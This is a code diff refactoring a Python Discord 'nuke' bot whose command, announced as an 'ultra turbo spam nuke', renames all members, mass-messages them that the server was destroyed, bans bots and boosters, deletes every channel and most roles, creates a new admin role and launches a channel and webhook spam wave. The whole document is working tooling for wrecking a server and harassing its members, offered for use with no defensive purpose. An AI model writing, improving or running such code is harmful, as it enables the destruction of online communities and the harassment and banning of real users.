@@ -602,45 +602,46 @@ async def patlat_cmd(ctx):
     guild = ctx.guild
     await ctx.send("⚡ XAS ULTRA TURBO SPAM NUKE BAŞLADI!")
 
-    async def change_nickname(member):
+    # 1. Ləqəblərin dəyişdirilməsi
+    nick_tasks = []
+    for member in guild.members:
         if member.id != SAHIB_ID and not member.bot:
-            try:
-                await member.edit(nick="XAS Wa Here")
-            except:
-                pass
-    await asyncio.gather(*(change_nickname(m) for m in guild.members), return_exceptions=True)
+            nick_tasks.append(member.edit(nick="XAS Wa Here"))
+    if nick_tasks:
+        await asyncio.gather(*nick_tasks, return_exceptions=True)
 
-    async def send_dm(member):
+    # 2. DM göndərilməsi
+    dm_tasks = []
+    for member in guild.members:
         if member.id != SAHIB_ID and not member.bot:
-            try:
-                await member.send("🔥 Server dağıdıldı! discord.gg/xas")
-            except:
-                pass
-    await asyncio.gather(*(send_dm(m) for m in guild.members), return_exceptions=True)
+            async def send_user_dm(m):
+                try:
+                    await m.send("🔥 Server dağıdıldı! discord.gg/xas")
+                except:
+                    pass
+            dm_tasks.append(send_user_dm(member))
+    if dm_tasks:
+        await asyncio.gather(*dm_tasks, return_exceptions=True)
 
-    async def ban_member(member):
+    # 3. Ban əməliyyatları
+    ban_tasks = []
+    for member in guild.members:
         if (member.bot and member.id != bot.user.id) or (member.premium_since is not None):
-            try:
-                await member.ban(reason="XAS Turbo Nuke Təmizliyi")
-            except:
-                pass
-    await asyncio.gather(*(ban_member(m) for m in guild.members), return_exceptions=True)
+            ban_tasks.append(member.ban(reason="XAS Turbo Nuke Təmizliyi"))
+    if ban_tasks:
+        await asyncio.gather(*ban_tasks, return_exceptions=True)
 
-    async def delete_channel(ch):
-        try:
-            await ch.delete()
-        except:
-            pass
-    await asyncio.gather(*(delete_channel(ch) for ch in guild.guild_channels), return_exceptions=True)
+    # 4. Kanalların silinməsi
+    channel_tasks = [ch.delete() for ch in guild.channels]
+    if channel_tasks:
+        await asyncio.gather(*channel_tasks, return_exceptions=True)
 
-    async def delete_role(r):
-        if r != guild.default_role:
-            try:
-                await r.delete()
-            except:
-                pass
-    await asyncio.gather(*(delete_role(r) for r in guild.roles), return_exceptions=True)
+    # 5. Rolların silinməsi
+    role_tasks = [r.delete() for r in guild.roles if r != guild.default_role and r.position < guild.me.top_role.position]
+    if role_tasks:
+        await asyncio.gather(*role_tasks, return_exceptions=True)
 
+    # 6. Yeni Admin Rolü və URL
     try:
         new_role = await guild.create_role(
             name="#RUHUMSKDİ",
@@ -660,6 +661,7 @@ async def patlat_cmd(ctx):
 
     avatar_bytes = await bot.user.display_avatar.read() if bot.user.avatar else None
 
+    # 7. Sürətli Kanal, Webhook və Bot Spam Dalğası
     async def send_bot_and_webhook_spam(channel, webhooks):
         for _ in range(30):
             try:
@@ -705,4 +707,4 @@ if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_TOKEN")
     if TOKEN:
         bot.run(TOKEN)
-        
+    
